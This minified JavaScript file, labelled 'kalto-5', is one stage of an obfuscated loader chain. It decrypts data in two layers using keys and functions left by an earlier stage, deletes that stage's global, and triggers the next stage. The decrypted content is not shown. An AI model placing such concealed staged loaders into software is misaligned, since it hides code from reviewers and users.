/*! kalto-5 */
(function(_){"use strict";
var _b="PZIgokdKFs3F2F7F5qogv8+637QsrcTHioG1+A0+5P4=";
function _x(s){var b=atob(s),u=new Uint8Array(b.length);for(var i=0;i<b.length;i++)u[i]=b.charCodeAt(i);return u;}
var KB=_x(_b);
async function _go(){
 var k4=_['_$gmfy0x']; if(!k4){ setTimeout(_go,50); return; }
 var Mseed=new Uint8Array(k4.a.length+1);Mseed.set(k4.a,0);Mseed[k4.a.length]=0x4D;
 var M=await k4._e(Mseed,k4.c.length);
 var raw=k4._n(k4.c,M);
 var Qseed=new Uint8Array(KB.length+1);Qseed.set(KB,0);Qseed[KB.length]=0x51;
 var Q=await k4._e(Qseed,raw.length);
 var rex=k4._n(raw,Q);
 _['_$r5h968']={r:rex,v:k4.v,a:k4.a,b:KB,_n:k4._n,_e:k4._e,_h:k4._h};
 try{delete _['_$gmfy0x'];}catch(e){_['_$gmfy0x']=null;}
 _['_$t3_ir5']=(_['_$t3_ir5']||0)|1;
 if(_['_$ujp7c6']&&typeof _['_$ujp7c6']._run==='function') _['_$ujp7c6']._run();
}
_go();
})(this);
